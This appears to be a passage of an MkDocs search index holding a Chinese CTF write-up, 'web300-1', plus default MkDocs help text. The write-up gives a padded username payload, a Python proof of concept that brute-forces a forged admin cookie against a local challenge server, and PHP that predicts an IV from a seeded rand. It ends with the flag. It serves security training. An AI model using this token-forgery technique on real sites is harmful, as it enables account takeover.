'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00tadmin' Payload urlencode: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin md5: fe46d7d8924ec23d69f8d01432de41aa 3. \u6240\u4ee5\u9700\u8981\u6784\u9020\u7684\u7528\u6237\u540d\u4e3a wonderkun%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa \u7528\u8fd9\u4e2a\u8d26\u53f7\u6ce8\u518c\u4e00\u4e2a\u7528\u6237,\u7136\u540e\u7528\u8fd9\u4e2a\u8d26\u53f7\u767b\u9646\u83b7\u53d6cookie\u7684token\u7684\u524d190\u4f4d,\u5c31\u662f\u8fd995\u7684\u52a0\u5bc6\u7ed3\u679c,\u4f46\u662f95\u4f4d\u662f\u9700\u8981\u8fdb\u884cpad\u7684,\u6269\u5c55\u4e86\u4e00\u4f4d,\u6240\u4ee5\u6700\u540e\u4e00\u4f4d\u7684\u52a0\u5bc6\u7ed3\u679c\u9700\u8981\u7206\u7834\u51fa\u6765: \u7ed9\u51fa\u4e86 python\u7684poc: #!/usr/bin/python # coding:utf-8 import requests def login (): url = \"http://127.0.0.1:4444/index.php?action=login\" data = \"user=wonderkun %80% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 00 %00% 98 %00% 00 %00% 00 %00% 00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa&pwd=1\" header = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } res = requests . post ( url , data = data , allow_redirects = False , proxies = { \"http\" : \"127.0.0.1:8080\" }, headers = header ) return res . cookies [ 'token' ][: 190 ] def getAdminToken ( token ): randstr = \"0123456789abcdef\" for i in randstr : for j in randstr : # token = token+i+j url = \"http://127.0.0.1:4444/index.php?action=home\" headers = { 'Cookie' : 'sign=' + 'fe46d7d8924ec23d69f8d01432de41aa' + ';' + 'token=' + token + i + j } # print url proxy = { \"http\" : \"127.0.0.1:8080\" } res = requests . get ( url , headers = headers , proxies = proxy ) if \"User\" in res . text : print \"[*] Cookie:\" , headers [ 'Cookie' ] return else : print \"[*] failed\" # print res.text if __name__ == \"__main__\" : tokenPre = login () print tokenPre getAdminToken ( tokenPre ) \u83b7\u53d6\u4e00\u4e2a\u53ef\u7528\u7684cookie,\u5c31\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e2a\u7ba1\u7406\u5458\u8eab\u4efd: [*] Cookie: sign=fe46d7d8924ec23d69f8d01432de41aa;token=2a3654363a57be283fbfc6d730c55c646cfe9b1a04c1ff10aa80327828ab6ca990b95fe6a00a9f6494abb1d47321643ed79e8c6b33bb6074e91a5d5be9f92fb5933500e7859129b4dc2c3f99b7738fa4dfed60e2fc8cb34f959e4287ce53185c \u63a5\u4e0b\u6765\u83b7\u53d6 iv,\u770bbackup.txt\u7684\u65f6\u95f4, Apr 12 09:26 \u8f6c\u5316\u4e3a\u65f6\u95f4\u6233\u4e3a: 1491960409 \u83b7\u53d6 iv,\u770bbackup.txt\u7684\u65f6\u95f4, <div class=\"codehilite\"><pre><span></span>Apr 12 09:26 \u8f6c\u5316\u4e3a\u65f6\u95f4\u6233\u4e3a: 1491960409 </pre></div> \u83b7\u53d6 iv: ** \u6ce8\u610f\u8fd9\u91cc\u8981\u752864\u7684linux\u64cd\u4f5c\u7cfb\u7edf\u4ea7\u751f iv,windows\u548clinux\u4ea7\u751f\u7684\u968f\u673a\u5e8f\u5217\u662f\u4e0d\u4e00\u6837\u7684 ** function getRandChar($length){ $str = null; $strPol = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz\"; for($i=0;$i<$length;$i++){ $n = rand(0, strlen($strPol) - 1); $str.=$strPol[$n]; } return $str; } srand( 1491960409/ 300); $iv = getRandChar(16); echo bin2hex($iv); echo \"\\n\"; \u83b7\u53d6$iv = 6f39784745597a644b52354a50497976 \u7136\u540e\u89e3\u5bc6:backup.txt\u7684\u5185\u5bb9: \u5f97\u5230flag: flag{660b7b8c06e3150d174a3ec9fcd7ab9d}","title":"web300-1 writeup"},{"location":"web300/web300-1/#wp","text":"[*] chamd5\u5b89\u5168\u56e2\u961f [*] \u58a8\u9e92\u9e9f\u5b89\u5168\u5b9e\u9a8c","title":"\u522b\u7684\u89e3\u9898\u601d\u8def\u7684wp"},{"location":"\u5165\u95e8\u9898\u76ee/","text":"Welcome to MkDocs \u00b6 For full documentation visit mkdocs.org . Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message. Project layout \u00b6 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"\u5165\u95e8"},{"location":"\u5165\u95e8\u9898\u76ee/#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"\u5165\u95e8\u9898\u76ee/#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message.","title":"Commands"},{"location":"\u5165\u95e8\u9898\u76ee/#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"}]}